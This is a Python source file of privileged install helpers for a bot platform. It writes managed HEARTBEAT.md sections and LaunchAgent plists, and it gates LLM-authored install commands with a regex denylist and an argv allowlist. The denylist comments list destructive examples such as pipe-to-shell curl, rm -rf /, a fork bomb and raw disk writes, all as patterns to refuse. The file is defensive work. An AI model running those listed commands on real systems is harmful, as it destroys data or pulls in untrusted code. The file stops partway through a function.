"""install_helpers.py — privileged install operations for forge Phase 4.5.

Spec: docs/spec-forge-side-effects-2026-06-02.md §5 (Materialize phase),
amended by docs/spec-heartbeat-instruction-2026-06-03.md.

Operations, each returning a deterministic dict envelope (``{ok,
artifact, error, …}``) so the HTTP route layer
(forge_install_routes.py) and the forge engine (forge_engine.py Phase
4.5) can call them uniformly:

  install_heartbeat_instruction(bot_id, file, section_anchor, body)   [v17]
    Writes a section in the bot's HEARTBEAT.md (or AGENTS.md) with an
    ``<!-- evolve-managed -->`` marker. The bot's session-driven LLM
    reads the file when the heartbeat fires a turn and executes the
    instruction. Replaces ``install_oc_hook`` — OpenClaw has no
    ``hooks.heartbeat[]`` array in its config schema, so the prior
    design (patch openclaw.json) was structurally wrong. See spec
    §1 for the 2026-06-02 live-validation finding.

  install_oc_hook(bot_id, hook_event, command)                        [deprecated]
    Returns an error envelope pointing at ``install_heartbeat_instruction``.
    Kept for one schema version so callers still get a clear
    diagnostic during the migration.

  install_launch_agent(bot_id, label, plist_xml)
    Writes a plist to ``/Users/{bot}/Library/LaunchAgents/{label}.plist``
    via /tmp staging + sudo cp + chown + chmod, then runs
    ``launchctl bootstrap`` in the bot user's launchd domain so the
    LaunchAgent loads immediately.

  install_crontab_entry(bot_id, schedule, command, label)
    Currently raises NotImplementedError — the evolve service user has
    no `sudo -u <bot> crontab` grant (see CLAUDE.md §"File Access
    Pattern"), so per-bot crontab installation needs a sudoers addition
    before this can be wired. Deferred to a follow-up PR; spec §4.1
    flags crontab as a legacy mechanism discouraged for new apps anyway.

All operations are best-effort: failures return ``{ok: False, ...}``
rather than raising, so a partial install can complete the other
entries in ``manifest.scheduled_actions[]`` and surface a per-entry
status table to the operator.

CLAUDE.md compliance:
  - Reads use direct Path APIs (the ``evolve`` user has ACL read on
    the bot's .openclaw/ + .openclaw/workspace/), with sudo /bin/cat
    fallback for newly-deployed bots.
  - Writes to the bot's workspace go direct (evolve has write ACL).
  - Writes to /Library/LaunchAgents/ go through /tmp staging + sudo
    /bin/cp + chown, NEVER via ``sudo -u <bot>`` (no such grant).
  - Full paths to system commands (/bin/cp, /usr/sbin/chown, etc.).
"""

from __future__ import annotations

import json
import logging
import os
import re
import subprocess
import tempfile
from pathlib import Path
from typing import Any

from ..config import DEFAULT_SHARED_DIR, bot_home, get_bot_user, load_network
from ..deploy import VENV_PYTHON, per_bot_gateway_plist_label, safe_write_bot_config
from ..runtime import (
    JobSpec,
    get_launchd_scheduler,
    get_scheduler,
    render_launchd_plist,
)
from .placeholder_lint import (
    helper_script_from_command,
    scan_residual_placeholders,
)

logger = logging.getLogger(__name__)


# ── Pre-exec install command denylist ─────────────────────────────────────────
#
# Security review 2026-06-09 finding: forge app installs run
# ``subprocess.run(command, shell=True, ...)`` where ``command`` originates
# from an LLM-authored manifest ``install_cfg.command`` field.  The only
# prior barrier was the operator's approval click.
#
# This denylist is a conservative first gate: it refuses commands that
# contain obviously-dangerous constructs BEFORE any install helper writes
# anything to disk or forks a subprocess.  It is NOT a full allowlist
# policy engine — the complete capability model is a separate design
# decision (see roadmap item 2.5).
#
# Call ``check_install_command(cmd)`` before any path that executes a
# manifest-supplied command string.  Returns ``(True, "")`` when the
# command is acceptable; ``(False, reason)`` when it is not.
#
# Allowed (representative legitimates that must NOT be refused):
#   pip install <pkg>
#   pip3 install -r requirements.txt
#   npm install
#   npm install --save <pkg>
#   python3 setup.py install
#   python3 scripts/run.py
#   mkdir -p ${workspace}/data
#   cp config.json ${workspace}/
#   /bin/bash scripts/setup.sh
#   /usr/bin/env python3 scripts/run.py
#
# Refused (representative dangerous patterns):
#   sudo apt-get install ...          ← sudo
#   curl https://x.com/s.sh | sh      ← pipe-to-shell
#   wget https://x.com/s.sh | bash    ← pipe-to-shell
#   rm -rf /                          ← catastrophic rm
#   rm -rf ~                          ← home-dir wipe
#   chmod 777 /etc/passwd             ← world-write sensitive files
#   :(){ :|:& };:                     ← fork bomb
#   echo payload > /dev/sda           ← raw device write
#   cp payload /etc/cron.d/evil       ← write to /etc
#   cp payload /usr/local/bin/evil    ← write to /usr
#   cp payload /System/Library/evil   ← write to /System
#   cp payload /Users/other-user/...  ← write outside bot workspace
#   > /dev/null (as redirection to device)
#
# Rule rationale
# ──────────────
# Pattern 1 — sudo: shell=True means a ``sudo`` anywhere in the string
#   could escalate to root.  Legitimate install tooling (pip, npm) never
#   needs sudo inside a bot workspace.
#
# Pattern 2 — pipe-to-shell: ``curl URL | sh`` and ``wget URL | bash``
#   are the canonical supply-chain attack vector; refuse on the
#   ``| sh`` / ``| bash`` / ``| python`` shape regardless of the URL.
#
# Pattern 3 — catastrophic rm: ``rm -rf /`` and ``rm -rf ~`` (and
#   common variations) wipe the filesystem / home directory.
#
# Pattern 4 — write outside bot workspace: absolute paths to well-known
#   system directories indicate the command is not scoped to the bot.
#   We catch ``/etc``, ``/usr``, ``/System``, ``/Library``, and
#   ``/Users/`` followed by anything other than ``${...}`` or a workspace
#   variable (because ``${workspace}`` and ``${bot_id}`` are the only
#   valid /Users/ references in a bot manifest).
#
# Pattern 5 — chmod 777 / a+rwx: makes files world-writable; in a
#   multi-tenant bot environment this can leak data between bots.
#
# Pattern 6 — fork bomb: the ``:(){ :|:& };:`` shell idiom exhausts
#   process slots for the whole host.
#
# Pattern 7 — raw /dev/ writes: ``> /dev/sda`` etc. can destroy block
#   devices; ``/dev/`` as a redirect target outside of ``/dev/null``
#   and ``/dev/stdout``/``/dev/stderr`` is suspicious enough to block.

# Each entry is (name, compiled_regex, human_reason).
# The regex is matched against the full command string (case-insensitive).
_DENYLIST: list[tuple[str, re.Pattern, str]] = []


def _deny(name: str, pattern: str, reason: str) -> None:
    """Register a denylist pattern (called at module import time)."""
    _DENYLIST.append((name, re.compile(pattern, re.IGNORECASE | re.DOTALL), reason))


# Rule 1 — sudo
_deny(
    "sudo",
    r"(?:^|[\s;|&`(])sudo\s",
    "sudo is not allowed in forge install commands (privilege escalation risk)",
)

# Rule 2 — pipe-to-shell (curl/wget piped into a shell interpreter)
_deny(
    "pipe_to_shell",
    r"\|\s*(?:sh|bash|zsh|dash|ksh|csh|tcsh|fish|python[23]?|perl|ruby|node)\b",
    "pipe-to-shell pattern (| sh / | bash / | python …) is not allowed "
    "(supply-chain attack vector)",
)

# Rule 3a — rm -rf with / or ~ (catastrophic wipe)
_deny(
    "rm_rf_root",
    r"\brm\b[^;|&\n]*-[^\s]*r[^\s]*f[^\s]*\s+[/~]",
    "rm -rf / or rm -rf ~ is not allowed (catastrophic filesystem wipe)",
)
# Rule 3b — same with flags reversed (-fr)
_deny(
    "rm_fr_root",
    r"\brm\b[^;|&\n]*-[^\s]*f[^\s]*r[^\s]*\s+[/~]",
    "rm -fr / or rm -fr ~ is not allowed (catastrophic filesystem wipe)",
)

# Rule 4 — write to well-known system directories (absolute paths that
#   don't belong in a bot workspace).
#   Allowed: ${workspace}, ${bot_id} substitutions (start with ${)
#   Blocked: /etc, /usr, /System, /Library, /bin, /sbin,
#            /Users/ followed by a literal account path (not ${...})
_deny(
    "write_system_path",
    r"""(?x)                             # verbose mode
    (?:>|>>|cp\s+\S+\s+|mv\s+\S+\s+|   # redirection or copy/move target
       install\s+.*?                    # install ... dest
       |tee\s+|ln\s+\S+\s+)            # tee or symlink dest
    \s*
    (?:/etc/|/usr/|/System/|/Library/|  # system dirs
       /bin/(?!bash\b|sh\b)|/sbin/)     # /bin and /sbin (allow /bin/bash)
    """,
    "writing to system paths (/etc/, /usr/, /System/, /Library/, /bin/, /sbin/) "
    "is not allowed in forge install commands",
)
_deny(
    "write_other_users",
    r"""(?x)
    (?:>|>>|cp\s+\S+\s+|mv\s+\S+\s+|tee\s+|ln\s+\S+\s+)
    \s*
    /Users/(?!\$\{)            # /Users/ NOT followed by a ${...} variable
    """,
    "writing to /Users/<account> paths outside the bot workspace is not allowed; "
    "use ${workspace} or ${bot_id} substitutions",
)

# Rule 5 — chmod 777 / a+rwx (world-writable)
_deny(
    "chmod_world_writable",
    r"\bchmod\b[^;|&\n]*(?:777|[aog]\+[rwx]*w[rwx]*|0777)\b",
    "chmod 777 / world-writable permissions are not allowed in forge install commands",
)

# Rule 6 — fork bomb
_deny(
    "fork_bomb",
    r":\(\)\s*\{",
    "fork bomb pattern :(){ ... } is not allowed",
)

# Rule 7 — raw writes to /dev/ (except /dev/null, /dev/stdout, /dev/stderr)
_deny(
    "dev_write",
    r"""(?x)
    (?:>|>>|tee\s+)
    \s*
    /dev/
    (?!null\b|stdout\b|stderr\b|fd/)   # allow safe pseudo-devices
    """,
    "raw writes to /dev/ device paths are not allowed in forge install commands",
)


def check_install_command(command: str) -> tuple[bool, str]:
    """Check a manifest-supplied install command against the denylist.

    Returns ``(True, "")`` when no dangerous pattern is found.
    Returns ``(False, reason)`` when a denylist rule fires, where
    ``reason`` is a human-readable description of the violation for
    surface to the operator.

    This function is conservative: it refuses only patterns that are
    unambiguously dangerous.  Ambiguous or policy-level decisions (e.g.
    "is this URL trusted?") are out of scope — the operator approval
    gate handles those.

    Raises nothing; all errors are returned in the tuple.
    """
    if not command or not isinstance(command, str):
        return True, ""   # empty command; let the caller's own validation fire

    for name, pattern, reason in _DENYLIST:
        if pattern.search(command):
            logger.warning(
                "forge install command refused by denylist rule %r: %s",
                name, command[:200],
            )
            return False, f"[{name}] {reason}"

    return True, ""


# ── Argv-vector exec policy (roadmap 2.9, decision D3) ────────────────────────
#
# The regex denylist above is shapeable by an LLM-authored command —
# ``$(…)``, backticks, ``${IFS}``, and base64-pipe shapes walk through
# pattern lists. Decision D3 (docs/decision-security-defaults-2026-06-10.md)
# removes the *class*: manifest commands execute as an argv vector
# (``shell=False``), so metacharacters are inert bytes, and the first token
# must be an allowlisted interpreter/tool or a file inside the bot's own
# workspace. The denylist stays as belt-and-braces on the raw string.
#
# Evidence the allowlist is sufficient: every real ``install_cfg.command``
# in the gallery follows ``[interpreter] [path] [subcommand/args]``. A
# manifest that genuinely needs compound shell logic ships a ``.sh``/``.py``
# script artifact (which goes through script review) and invokes that.

# Tokens that are shell operators — meaningless (and almost certainly
# author error) once there is no shell.
_SHELL_OPERATOR_TOKENS = frozenset({
    "|", "||", "&", "&&", ";", ">", ">>", "<", "<<", "2>", "2>>", "&>",
})

# Substrings that request shell evaluation. Inert under shell=False, but
# their presence means the author expected shell semantics — running them
# literally would silently do the wrong thing, so refuse loudly instead.
# Checked AFTER ${bot_id}/${workspace} substitution, so manifest variables
# don't trip the ``${`` marker.
_SHELL_EVAL_MARKERS = ("$(", "`", "${")

# First-token allowlist, matched on basename. Deliberately small — covers
# every legitimate command shape observed across the gallery (interpreters,
# package managers, simple file utilities, requirement probes). Extending
# it is a one-line, reviewed change.
_EXEC_ALLOWED_BASENAMES = frozenset({
    "python", "python3",
    "pip", "pip3",
    "bash", "sh",
    "npm", "npx", "node",
    "mkdir", "cp", "chmod", "cat", "echo",
    "which",
    "env",
})

# Interpreters that accept inline code via a flag (``-c`` / ``-e`` / ``-m`` /
# stdin ``-``). For these, the allowlist alone is theatre — ``python3 -c
# "import os;os.system(...)"`` runs arbitrary code with no shell and no
# metacharacter. So for a code interpreter the first argument MUST be a
# script path, never an option flag: compound logic goes in a script file
# (whose contents are reviewable) invoked as ``<interpreter> <script>``.
# This is the one shape that, given an LLM-authored command, makes the
# interpreter allowlist a real boundary instead of a speed bump.
_CODE_INTERPRETERS = frozenset({"python", "python3", "bash", "sh", "node"})


def parse_exec_argv(command: str) -> "tuple[list[str] | None, str]":
    """Parse a manifest-supplied command string into an argv vector.

    Returns ``(argv, "")`` on success, ``(None, reason)`` when the command
    needs a shell (operators, evaluation markers, newlines) or doesn't
    parse. Call with the post-substitution string.
    """
    if not command or not isinstance(command, str):
        return None, "empty command"
    if "\n" in command or "\r" in command:
        return None, "newline in command — one command per scheduled action"
    for marker in _SHELL_EVAL_MARKERS:
        if marker in command:
            return None, (
                f"shell evaluation marker {marker!r} found — commands run as "
                "an argv vector with no shell; put computed logic in a script "
                "file and invoke the script instead"
            )
    import shlex
    try:
        argv = shlex.split(command)
    except ValueError as exc:
        return None, f"command does not parse: {exc}"
    if not argv:
        return None, "command parses to empty argv"
    for tok in argv:
        if tok in _SHELL_OPERATOR_TOKENS:
            return None, (
                f"shell operator {tok!r} found — pipes/chaining/redirection "
                "need a shell; wrap the logic in a script file and invoke "
                "the script instead"
            )
    return argv, ""


def _is_inside_workspace(head: str, workspace: str) -> bool:
    """True if ``head`` resolves (lexically) to a path inside ``workspace``.

    ``..`` segments are rejected outright and the path is ``normpath``'d
    before the containment check, so ``{workspace}/../../etc/x`` can't
    masquerade as workspace-resident (review finding, 2.9).
    """
    if not workspace or not head.startswith("/"):
        return False
    if ".." in head.split("/"):
        return False
    ws = os.path.normpath(workspace)
    resolved = os.path.normpath(head)
    return resolved == ws or resolved.startswith(ws + "/")


def _check_interpreter_args(base: str, rest: "list[str]") -> tuple[bool, str]:
    """For a code interpreter, require ``<interpreter> <script-path> …`` —
    no inline-code/option flags as the first argument."""
    if base in _CODE_INTERPRETERS:
        if not rest:
            return False, (
                f"{base} requires a script-path argument (an interpreter with "
                "no script can only run inline code, which is not allowed)"
            )
        if rest[0].startswith("-"):
            return False, (
                f"{base} {rest[0]!r}: inline-code / option flags (-c, -e, -m, "
                "stdin -) are not allowed — put the logic in a script file and "
                "invoke it as `{base} <script>` so its contents are reviewable"
            )
    return True, ""


def validate_exec_argv(argv: "list[str]", *, workspace: str = "") -> tuple[bool, str]:
    """Enforce the exec policy on a parsed argv vector.

    Accepted heads:
      1. A file inside the bot's own workspace (the bot already owns it —
         invoking it adds no authority a reviewed ``bash <script>`` wouldn't).
      2. An allowlisted interpreter/tool basename. For *code interpreters*
         (python/bash/sh/node) the first argument must be a script path, not
         an inline-code flag — otherwise ``python3 -c "<payload>"`` would be
         arbitrary code exec straight through the allowlist.
      3. ``env <interpreter> …``, with the same rules applied to the real
         target after skipping VAR=val assignments and env's own flags.
    """
    if not argv:
        return False, "empty argv"
    head = argv[0]
    base = os.path.basename(head)

    # 1. Bot-workspace-owned executable invoked directly. It runs as
    #    ``<exe> <positional args>`` — a leading OPTION FLAG is refused. The
    #    bot owns its workspace, so a file/symlink it drops there (named
    #    ``python3`` or aliased ``py``/``foo``) could otherwise carry inline
    #    interpreter code: ``-c`` / joined ``-cimport os`` / ``-W x -c …``.
    #    Enumerating interpreter flags is the trap 2.9 avoids, so refuse the
    #    flag SHAPE wholesale. No gallery command needs a flag on a direct
    #    workspace head; the interpreter-led form (``/bin/bash <script>
    #    --flag``, which the gallery uses) handles that case and routes the
    #    flags to the script, not to an inline-code switch.
    if _is_inside_workspace(head, workspace):
        if len(argv) > 1 and argv[1].startswith("-"):
            return False, (
                f"{head!r}: a workspace executable takes positional arguments "
                "only — a leading option flag can smuggle inline interpreter "
                "code. Invoke via an interpreter (`/bin/bash <script> --flag`) "
                "if option flags are needed."
            )
        return True, ""

    # 3. env <interpreter> … — resolve the real target + its args.
    if base == "env":
        i = 1
        while i < len(argv) and ("=" in argv[i] or argv[i].startswith("-")):
            i += 1
        if i >= len(argv):
            return False, "env with no command target"
        target = argv[i]
        tbase = os.path.basename(target)
        if tbase == "env" or tbase not in _EXEC_ALLOWED_BASENAMES:
            return False, (
                f"env target {target!r} is not an allowlisted interpreter/tool"
            )
        return _check_interpreter_args(tbase, argv[i + 1:])

    # 2. Direct allowlisted interpreter/tool.
    if base in _EXEC_ALLOWED_BASENAMES:
        return _check_interpreter_args(base, argv[1:])

    return False, (
        f"command head {head!r} is not an allowlisted interpreter/tool "
        f"({', '.join(sorted(_EXEC_ALLOWED_BASENAMES))}) or a path inside "
        "the bot workspace"
    )


def gate_exec_command(command: str, *, workspace: str = "") -> "tuple[list[str] | None, str]":
    """The full 2.9 pre-exec gate: denylist (belt-and-braces) + argv parse
    + allowlist. Returns ``(argv, "")`` or ``(None, reason)``.
    """
    ok, reason = check_install_command(command)
    if not ok:
        return None, reason
    argv, reason = parse_exec_argv(command)
    if argv is None:
        return None, reason
    ok, reason = validate_exec_argv(argv, workspace=workspace)
    if not ok:
        logger.warning(
            "forge install command refused by argv allowlist: %s", command[:200],
        )
        return None, reason
    return argv, ""


# ── Result shape ─────────────────────────────────────────────────────────────
#
# Tuple shape rather than dataclass because the three operations have
# slightly different "artifact" semantics (path vs json-pointer vs
# crontab entry_id) and the route layer needs to construct response
# JSON from whichever is meaningful. Callers MUST check ``ok`` before
# trusting ``artifact``.


def _ok(artifact: str, **extra: Any) -> dict:
    """Build the success envelope returned by every helper."""
    return {"ok": True, "artifact": artifact, "error": "", **extra}


def _err(error: str, **extra: Any) -> dict:
    """Build the failure envelope returned by every helper."""
    return {"ok": False, "artifact": "", "error": error, **extra}


# ── heartbeat-instruction — append/replace a managed section in HEARTBEAT.md ─
#
# v17 replacement for install_oc_hook. Spec:
# docs/spec-heartbeat-instruction-2026-06-03.md §3.


# Marker that identifies a section as evolve-managed. The package id of
# the owning app is embedded so we can attribute and clean up cleanly.
# Regex tolerates extra whitespace and arbitrary order of named groups
# for forward-compat.
_MANAGED_MARKER_RE = re.compile(
    r"<!--\s*evolve-managed(?::\s*(?P<kv>[^>]*))?\s*-->",
    re.IGNORECASE,
)

# Default header written when the target file (HEARTBEAT.md, AGENTS.md, …)
# doesn't exist yet. Self-documenting so the operator knows what the
# evolve-managed sections are for.
_DEFAULT_HEADER_BY_FILE: dict[str, str] = {
    "HEARTBEAT.md": (
        "# Heartbeat instructions\n\n"
        "The following sections are evolve-managed. Each describes one "
        "app's heartbeat behaviour. Do not edit `<!-- evolve-managed -->` "
        "sections by hand — use `evolve-admin app pause/uninstall` instead.\n"
    ),
    "AGENTS.md": (
        "# Agent instructions\n\n"
        "Sections marked `<!-- evolve-managed -->` are managed by forge. "
        "Operator-authored sections (without the marker) are preserved.\n"
    ),
}


def install_heartbeat_instruction(
    bot_id: str,
    file: str,
    section_anchor: str,
    body: str,
    *,
    pkg_id: str = "",
    job_id: str = "",
    network: dict | None = None,
) -> dict:
    """Idempotently install a managed section in the bot's workspace markdown.

    Spec: docs/spec-heartbeat-instruction-2026-06-03.md §3.

    - Reads ``{workspace}/{file}`` directly (evolve has ACL write/read).
    - If ``section_anchor`` exists AND carries the ``<!-- evolve-managed -->``
      marker: replaces the section body atomically.
    - If ``section_anchor`` exists WITHOUT the marker: refuses to overwrite
      (operator-authored content stays intact).
    - If ``section_anchor`` is missing: appends as a new section at the
      end of the file, with the marker automatically inserted on the line
      after the heading.
    - If the file itself is missing: creates it with the
      ``_DEFAULT_HEADER_BY_FILE`` header before appending.

    Returns dict envelope:
      ok: bool                 — overall success
      artifact: str            — ``"{file}#{section_anchor_text}"`` on success
      error: str               — diagnostic on failure
      already_present: bool    — True iff the section already had matching content
      created_file: bool       — True iff the file didn't exist and we created it

    No ``sudo`` required, no gateway kickstart needed. The bot LLM reads
    the file on its next heartbeat turn and executes the instruction.
    """
    if not bot_id or not file or not section_anchor or not body:
        return _err(
            "install_heartbeat_instruction requires bot_id, file, "
            "section_anchor, body"
        )
    section_anchor = section_anchor.strip()
    if not section_anchor.startswith("#"):
        return _err(
            f"section_anchor must start with `#` (markdown heading); "
            f"got {section_anchor!r}"
        )

    net = network or load_network()
    try:
        bot_user = get_bot_user(bot_id, net)
    except Exception as exc:
        return _err(f"could not resolve bot user: {exc}")

    workspace = Path(f"/Users/{bot_user}/.openclaw/workspace")
    target = workspace / file

    # Build the evolve-managed section body. The marker carries
    # `pkg=…` for attribution; the body is the natural-language
    # instruction the bot LLM executes.
    marker_kv = []
    if pkg_id:
        marker_kv.append(f"pkg={pkg_id}")
    if job_id:
        marker_kv.append(f"job={job_id}")
    marker_payload = " ".join(marker_kv)
    marker = (
        f"<!-- evolve-managed{(': ' + marker_payload) if marker_payload else ''} -->"
    )
    new_section = f"{section_anchor}\n{marker}\n\n{body.rstrip()}\n"

    # Read current content (best-effort).
    created_file = False
    try:
        text = target.read_text(encoding="utf-8")
    except FileNotFoundError:
        # Create with the documented default header.
        header = _DEFAULT_HEADER_BY_FILE.get(Path(file).name, "")
        text = header
        created_file = True
    except (OSError, UnicodeDecodeError) as exc:
        return _err(f"could not read {target}: {exc}")

    # Find an existing section with the same anchor.
    section_pos = _find_section(text, section_anchor)
    if section_pos is not None:
        start, end = section_pos
        existing = text[start:end]
        # Refuse-to-clobber unless this is an evolve-managed section.
        if not _MANAGED_MARKER_RE.search(existing):
            return _err(
                f"section {section_anchor!r} exists in {file} without an "
                f"<!-- evolve-managed --> marker; refusing to overwrite "
                f"operator-authored content"
            )
        # Idempotent: if the new section matches the existing managed
        # section byte-for-byte, no write needed.
        if existing.rstrip() == new_section.rstrip():
            artifact = _make_artifact(file, section_anchor)
            return _ok(artifact, already_present=True, created_file=False)
        new_text = text[:start] + new_section + text[end:]
    else:
        # Append at end with a blank-line separator if needed.
        sep = "" if text.endswith("\n\n") else ("\n" if text.endswith("\n") else "\n\n")
        new_text = text + sep + new_section

    # Atomic write — evolve has write ACL on workspace.
    try:
        target.parent.mkdir(parents=True, exist_ok=True)
        tmp = target.with_suffix(target.suffix + ".evolve-tmp")
        tmp.write_text(new_text, encoding="utf-8")
        os.replace(tmp, target)
    except OSError as exc:
        return _err(f"could not write {target}: {exc}")

    # os.replace leaves the new file owned by evolve (the user that wrote
    # the tmp), not the bot. install_integrity_monitor flags that as an
    # ownership_drift Signal, and any subsequent bot-user write — e.g.
    # OC's session-driven AGENTS.md rewrite — would hit EACCES. Restore
    # bot ownership via the sudoers grant for workspace markdown files
    # (see setup_wizard._render_evolve_sudoers §12).
    chown_err = _restore_bot_ownership(target, bot_user)
    if chown_err:
        return _err(chown_err)

    artifact = _make_artifact(file, section_anchor)
    return _ok(artifact, already_present=False, created_file=created_file)


def _restore_bot_ownership(target: Path, bot_user: str) -> str:
    """Chown ``target`` back to ``bot_user:staff`` via the workspace .md
    sudoers grant. Returns an error string on failure, empty on success.
    """
    import pwd
    try:
        bot_uid = pwd.getpwnam(bot_user).pw_uid
    except KeyError:
        # Bot user doesn't exist on this host (test environment, or a bot
        # that was uninstalled mid-call). Nothing to restore — leave the
        # file as-is and let the integrity monitor surface any drift.
        return ""
    try:
        if target.stat().st_uid == bot_uid:
            return ""  # Already correctly owned.
    except OSError:
        pass
    try:
        proc = subprocess.run(
            ["sudo", "/usr/sbin/chown", f"{bot_user}:staff", str(target)],
            capture_output=True, text=True, timeout=10,
        )
    except (OSError, subprocess.SubprocessError) as exc:
        return f"could not chown {target} to {bot_user}: {exc}"
    if proc.returncode != 0:
        return (
            f"could not chown {target} to {bot_user}: "
            f"{(proc.stderr or proc.stdout or '').strip()}"
        )
    return ""


def _find_section(text: str, section_anchor: str) -> tuple[int, int] | None:
    """Return (start, end) byte offsets of the named section in text.

    The section starts at the matching heading line and ends at the next
    heading at the SAME or HIGHER level (i.e., ``##`` ends at the next
    ``##`` or ``#``; ``###`` ends at the next ``###`` / ``##`` / ``#``).
    Returns None when the anchor isn't present.
    """
    level = 0
    for ch in section_anchor:
        if ch != "#":
            break
        level += 1
    if level == 0:
        return None
    # Find the heading line — must match exactly at the start of a line.
    heading_re = re.compile(
        r"^" + re.escape(section_anchor) + r"\s*$",
        re.MULTILINE,
    )
    m = heading_re.search(text)
    if not m:
        return None
    start = m.start()
    # Find the next heading at level ≤ this one. ``^(#{1,L})\s+\S`` where
    # L is the current level.
    end_re = re.compile(
        r"^#{1," + str(level) + r"}\s+\S", re.MULTILINE,
    )
    next_m = end_re.search(text, m.end())
    end = next_m.start() if next_m else len(text)
    return (start, end)


def _make_artifact(file: str, section_anchor: str) -> str:
    """Build the ``installed_artifact`` value: ``{file}#{anchor_text}``."""
    # Strip the leading '#'s + whitespace from the heading to produce a
    # clean anchor fragment. ``## Task Manager — Check`` → ``Task Manager
    # — Check``.
    anchor_text = section_anchor.lstrip("#").strip()
    return f"{file}#{anchor_text}"


# ── openclaw-patch — append a hook entry + kickstart gateway ─────────────────


def install_oc_hook(
    bot_id: str,
    hook_event: str,
    command: str,
    *,
    network: dict | None = None,
    kickstart: bool = True,
) -> dict:
    """DEPRECATED in v17 — see spec-heartbeat-instruction-2026-06-03.md §1.

    OpenClaw has no top-level ``hooks`` field in its config schema; the
    prior PR 4 design (patch ``openclaw.json`` under ``hooks.{event}[]``)
    was structurally wrong. The 2026-06-02 live validation surfaced this
    when ``safe_write_bot_config`` correctly rejected the patch with
    ``hooks: Invalid input``.

    The v17 replacement is ``install_heartbeat_instruction`` (writes a
    managed section to ``HEARTBEAT.md``). This wrapper stays for one
    schema version so callers see a clear diagnostic; remove in v18.
    """
    del bot_id, hook_event, command, network, kickstart  # unused now
    return _err(
        "install_oc_hook is deprecated in v17. OpenClaw has no "
        "hooks.heartbeat[] array in its config schema — call "
        "install_heartbeat_instruction(bot_id, file='HEARTBEAT.md', "
        "section_anchor='## ...', body='...') instead. "
        "Spec: docs/spec-heartbeat-instruction-2026-06-03.md."
    )


def _install_oc_hook_legacy_impl(
    bot_id: str,
    hook_event: str,
    command: str,
    *,
    network: dict | None = None,
    kickstart: bool = True,
) -> dict:
    """Pre-v17 implementation, kept for the unit tests that documented
    the original behaviour. Not exported. Will be deleted in v18."""
    if not bot_id or not hook_event or not command:
        return _err("install_oc_hook requires bot_id, hook_event, command")

    net = network or load_network()
    try:
        bot_user = get_bot_user(bot_id, net)
    except Exception as exc:
        return _err(f"could not resolve bot user: {exc}")

    config_path = Path(f"/Users/{bot_user}/.openclaw/openclaw.json")

    # Read current config. The evolve user has ACL read on .openclaw/ for
    # any deployed bot (set_evolve_read_acl in deploy.py). Fall back to
    # sudo /bin/cat for newly-deployed bots whose ACL hasn't propagated.
    raw = ""
    try:
        raw = config_path.read_text()
    except (OSError, PermissionError):
        r = subprocess.run(
            ["sudo", "/bin/cat", str(config_path)],
            capture_output=True, text=True, timeout=5,
        )
        if r.returncode != 0:
            return _err(
                f"could not read openclaw.json for {bot_id!r}: "
                f"{r.stderr.strip()[:200]}"
            )
        raw = r.stdout
    try:
        config = json.loads(raw)
    except (json.JSONDecodeError, ValueError) as exc:
        return _err(f"openclaw.json is not valid JSON: {exc}")
    if not isinstance(config, dict):
        return _err("openclaw.json is not a JSON object at root")

    # Materialize the patch. Preserve every other field exactly.
    hooks = config.setdefault("hooks", {})
    if not isinstance(hooks, dict):
        return _err(f"openclaw.json hooks is not a dict (got {type(hooks).__name__})")
    entries = hooks.setdefault(hook_event, [])
    if not isinstance(entries, list):
        # Older OC versions sometimes carry a bare bool flag (e.g. heartbeat:
        # true). The forge install would clobber operator intent; refuse.
        return _err(
            f"hooks.{hook_event} is not a list (got {type(entries).__name__}); "
            f"manual cleanup required before forge can install here"
        )

    # Idempotency: skip if an identical command is already registered.
    for idx, existing in enumerate(entries):
        if isinstance(existing, dict):
            existing_cmd = existing.get("command") or existing.get("cmd") or ""
            if existing_cmd == command:
                artifact = f"openclaw.json#hooks.{hook_event}[{idx}]"
                return _ok(artifact, restart_required=False, already_present=True)

    new_idx = len(entries)
    entries.append({"command": command})

    # Write through the existing L2 applier (validate-against-OC-schema
    # first; abort on failure; backup before write). This is the safety
    # contract that prevents a malformed hook from crash-looping the
    # gateway. Reason string lands in the .bak audit trail.
    ok, err = safe_write_bot_config(
        bot_id,
        config,
        reason=f"forge: install hooks.{hook_event} entry",
        bot_user=bot_user,
    )
    if not ok:
        return _err(f"safe_write_bot_config rejected the patch: {err}")

    if kickstart:
        # Best-effort kickstart (Scheduler seam) so the new hook takes
        # effect without waiting for the next session. Failure here is
        # not a write failure — the patch already landed; the operator
        # may need to restart the gateway manually.
        k_ok, k_out = get_scheduler().restart(per_bot_gateway_plist_label(bot_id))
        if not k_ok:
            logger.warning("forge install: gateway kickstart for %s failed: %s",
                           bot_id, k_out)

    artifact = f"openclaw.json#hooks.{hook_event}[{new_idx}]"
    return _ok(artifact, restart_required=True, already_present=False)


# ── launch-agent — write plist + launchctl bootstrap ─────────────────────────


def install_launch_agent(
    bot_id: str,
    label: str,
    plist_xml: str,
    *,
    network: dict | None = None,
    bootstrap: bool = True,
) -> dict:
    """Write ``/Users/{bot}/Library/LaunchAgents/{label}.plist`` and bootstrap.

    Idempotent: re-installing the same label first bootouts any existing
    load before bootstrapping the new plist. Non-fatal if the bootout
    finds nothing to remove.

    Returns dict envelope:
      ok: bool         — overall success
      artifact: str    — full path to the written plist on success
      error: str       — diagnostic on failure
      loaded: bool     — whether `launchctl bootstrap` succeeded
    """
    if not bot_id or not label or not plist_xml:
        return _err("install_launch_agent requires bot_id, label, plist_xml")
    if "/" in label or label.endswith(".plist"):
        # Defense-in-depth — label should be the bare reverse-DNS name.
        return _err(f"invalid label {label!r}: must not contain '/' or '.plist' suffix")

    net = network or load_network()
    try:
        bot_user = get_bot_user(bot_id, net)
    except Exception as exc:
        return _err(f"could not resolve bot user: {exc}")

    bot_uid = _bot_uid(bot_user)
    if bot_uid is None:
        return _err(f"could not resolve UID for bot user {bot_user!r}")

    la_dir = Path(f"/Users/{bot_user}/Library/LaunchAgents")
    plist_dest = la_dir / f"{label}.plist"

    # Stage to /tmp owned by evolve, then sudo cp into place. Per
    # CLAUDE.md §"Writes — /tmp staging + sudo /bin/cp".
    fd, tmp_path = tempfile.mkstemp(
        dir="/tmp", prefix=f"evolve-forge-{bot_id}-", suffix=".plist",
    )
    try:
        with os.fdopen(fd, "w") as f:
            f.write(plist_xml)

        # Ensure the LaunchAgents directory exists. Most bot homes don't
        # have it by default; create with bot ownership so launchd can
        # find what we drop in.
        if not la_dir.exists():
            r = subprocess.run(
                ["sudo", "/bin/mkdir", "-p", str(la_dir)],
                capture_output=True, text=True, timeout=5,
            )
            if r.returncode != 0:
